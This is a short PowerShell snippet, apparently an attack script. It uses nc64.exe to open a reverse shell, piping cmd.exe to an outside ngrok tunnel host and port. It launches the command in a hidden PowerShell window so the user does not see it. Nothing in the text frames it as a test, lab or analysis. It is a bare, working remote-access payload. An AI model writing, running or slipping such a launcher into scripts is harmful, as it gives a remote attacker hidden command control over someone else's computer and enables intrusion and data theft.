$command = ".\nc64.exe 7.tcp.eu.ngrok.io 10752 -e cmd.exe"
Start-Process "powershell.exe" -ArgumentList "-NoProfile -Command `"& { $command }`"" -WindowStyle Hidden
